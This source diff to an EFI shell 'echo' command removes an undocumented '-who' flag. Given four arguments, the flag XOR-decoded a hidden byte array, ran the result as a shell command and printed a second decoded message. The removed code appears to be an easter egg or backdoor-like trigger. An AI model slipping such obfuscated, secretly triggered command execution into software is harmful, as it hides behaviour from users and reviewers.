@@ -1,6 +1,6 @@
 /*++
 
-Copyright 2005, Intel Corporation                                                         
+Copyright (c) 2005, Intel Corporation                                                         
 All rights reserved. This program and the accompanying materials                          
 are licensed and made available under the terms and conditions of the BSD License         
 which accompanies this distribution. The full text of the license may be found at         
@@ -49,209 +49,12 @@ SHELL_VAR_CHECK_ITEM    EchoCheckList[] = {
     FlagTypeSingle
   },
   {
-    L"-who",
-    0x10,
-    0,
-    FlagTypeSingle
-  },
-  {
     NULL,
     0,
     0,
     0
   }
 };
-
-UINT16          password[] = {
-  0x0032,
-  0x0015,
-  0x000c,
-  0x000c,
-  0x0053,
-  0x002b,
-  0x0001,
-  0x001a,
-  0x002c,
-  0x004e,
-  0x001f,
-  0x0006,
-  0x0030,
-  0x0005,
-  0x002a,
-  0x0016,
-  0x0007,
-  0x0045,
-  0x0059,
-  0x0018,
-  0x000d,
-  0x003b,
-  0x0006,
-  0x004f,
-  0x0019,
-  0x0005,
-  0x0008,
-  0x001d,
-  0x0044,
-  0x0000
-};
-UINT16          data[] = {
-  0x0067,
-  0x0044,
-  0x0021,
-  0x0020,
-  0x0066,
-  0x003d,
-  0x0048,
-  0x003a,
-  0x001b,
-  0x0045,
-  0x001c,
-  0x001e,
-  0x004f,
-  0x0020,
-  0x0010,
-  0x0015,
-  0x0011,
-  0x004c,
-  0x0050,
-  0x001d,
-  0x000c,
-  0x0001,
-  0x000b,
-  0x0054,
-  0x0054,
-  0x003c,
-  0x000c,
-  0x0012,
-  0x004d,
-  0x0050,
-  0x0057,
-  0x0027,
-  0x001a,
-  0x005b,
-  0x004d,
-  0x002a,
-  0x002a,
-  0x0073,
-  0x0028,
-  0x002e,
-  0x0048,
-  0x0045,
-  0x0066,
-  0x0035,
-  0x0026,
-  0x002e,
-  0x0053,
-  0x0068,
-  0x0025,
-  0x0033,
-  0x0043,
-  0x0044,
-  0x0022,
-  0x0042,
-  0x003a,
-  0x0074,
-  0x007a,
-  0x003f,
-  0x0045,
-  0x006e,
-  0x0040,
-  0x0062,
-  0x003d,
-  0x0006,
-  0x001d,
-  0x0016,
-  0x004c,
-  0x0050,
-  0x005a,
-  0x002c,
-  0x000c,
-  0x001c,
-  0x000d,
-  0x0015,
-  0x0009,
-  0x0013,
-  0x004d,
-  0x0044,
-  0x0032,
-  0x002f,
-  0x0055,
-  0x001a,
-  0x000d,
-  0x0049,
-  0x0040,
-  0x0010,
-  0x005c,
-  0x0052,
-  0x005d,
-  0x0054,
-  0x0045,
-  0x0057,
-  0x0054,
-  0x0005,
-  0x0071,
-  0x0067,
-  0x0000
-};
-
-
-VOID
-_Decode (
-  IN UINT16               *buf,
-  IN UINTN                bufsize,
-  IN CHAR16               *key
-  )
-{
-  UINTN   len;
-  CHAR16  *p;
-  CHAR16  *l;
-
-  len = bufsize / sizeof (UINT16) - 1;
-  p   = (CHAR16 *) buf;
-  l   = key;
-  while (len) {
-    len--;
-    *p ^= *l;
-    p++;
-    l++;
-    if (!*l) {
-      l = key;
-    }
-  }
-}
-
-EFI_STATUS
-_DoWhat (
-  IN EFI_HANDLE               ImageHandle,
-  IN SHELL_VAR_CHECK_PACKAGE  *ChkPck
-  )
-{
-  EFI_STATUS      Status;
-  SHELL_ARG_LIST  *Item;
-  POOL_PRINT      key;
-
-  key.len     = 0;
-  key.maxlen  = 0;
-  key.str     = NULL;
-
-  Item        = ChkPck->VarList;
-  while (Item) {
-    CatPrint (&key, L"%s ", Item->VarStr);
-    Item = Item->Next;
-  }
-
-  key.str[StrLen (key.str) - 1] = 0;
-
-  _Decode (password, sizeof (password), key.str);
-  Status = SEnvExecute (ImageHandle, password, FALSE);
-  if (!EFI_ERROR (Status)) {
-    _Decode (data, sizeof (data), key.str);
-    Print (data);
-  }
-
-  FreePool (key.str);
-  return Status;
-}
 
 EFI_STATUS
 SEnvCmdEcho (
@@ -330,18 +133,6 @@ Returns:
     PageBreak = TRUE;
   }
 
-  if (LibCheckVarGetFlag (&ChkPck, L"-who")) {
-    Status = EFI_INVALID_PARAMETER;
-    if (ChkPck.ValueCount == 4) {
-      Status = _DoWhat (ImageHandle, &ChkPck);
-    }
-
-    if (EFI_ERROR (Status)) {
-      PrintToken (STRING_TOKEN (STR_SHELLENV_GNC_UNKNOWN_FLAG), HiiEnvHandle, L"echo", L"-who");
-    }
-
-    goto Done;
-  }
   //
   // Out put help.
   //
